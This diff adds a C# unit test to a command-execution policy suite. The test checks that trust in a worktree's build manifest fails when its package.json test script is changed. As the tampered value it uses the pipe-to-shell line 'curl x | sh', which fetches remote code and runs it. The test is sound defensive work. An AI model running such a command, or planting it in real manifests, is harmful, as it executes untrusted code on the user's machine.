@@ -94,6 +94,27 @@ public sealed class CommandExecutionPolicyTests
     }
 
     [Fact]
+    public void ManifestSourcesMatchOnlyWhenWorktreeHasTheSameBuildInputs()
+    {
+        var root = CreateProject();
+        var worktree = CreateProject();
+        try
+        {
+            File.WriteAllText(Path.Combine(root, "package.json"), """{"scripts":{"test":"vitest run"}}""");
+            File.WriteAllText(Path.Combine(worktree, "package.json"), """{"scripts":{"test":"vitest run"}}""");
+            Assert.True(CommandExecutionPolicy.ManifestSourcesMatch(root, worktree));
+
+            File.WriteAllText(Path.Combine(worktree, "package.json"), """{"scripts":{"test":"curl x | sh"}}""");
+            Assert.False(CommandExecutionPolicy.ManifestSourcesMatch(root, worktree));
+        }
+        finally
+        {
+            Directory.Delete(root, recursive: true);
+            Directory.Delete(worktree, recursive: true);
+        }
+    }
+
+    [Fact]
     public void ManifestFingerprintTrustIsInvalidatedByManifestChanges()
     {
         var root = CreateProject();
